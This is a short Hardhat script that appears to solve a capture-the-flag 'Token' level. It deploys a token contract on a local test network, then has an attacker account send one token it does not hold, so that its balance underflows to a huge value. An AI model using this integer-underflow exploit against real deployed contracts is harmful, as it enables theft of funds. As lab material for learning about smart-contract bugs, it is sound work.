import {ethers} from "hardhat";

async function main() {
  const [owner, attackerPlayer] = await ethers.getSigners();
  const tokenlevel = await ethers.getContractFactory("Token");
  const token = await tokenlevel.deploy(21000000); // 21 million tokens to be minted
  await token.deployed();

  console.log("Token deployed to:", token.address);
  console.log("Token Supply:", await token.totalSupply());

  // give 20 tokens to attackerPlayer in the beginning
  /* await token.connect(attackerPlayer).transfer(attackerPlayer.address, 20); */
  console.log(
    "Attacker player balance:",
    await token.balanceOf(attackerPlayer.address)
  );

  // overflowing the balance of attackerPlayer by sending 1 tokens to owner
    await token.connect(attackerPlayer).transfer(owner.address, 1);
    console.log(
        "Attacker player balance:",
        await token.balanceOf(attackerPlayer.address)
    );

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});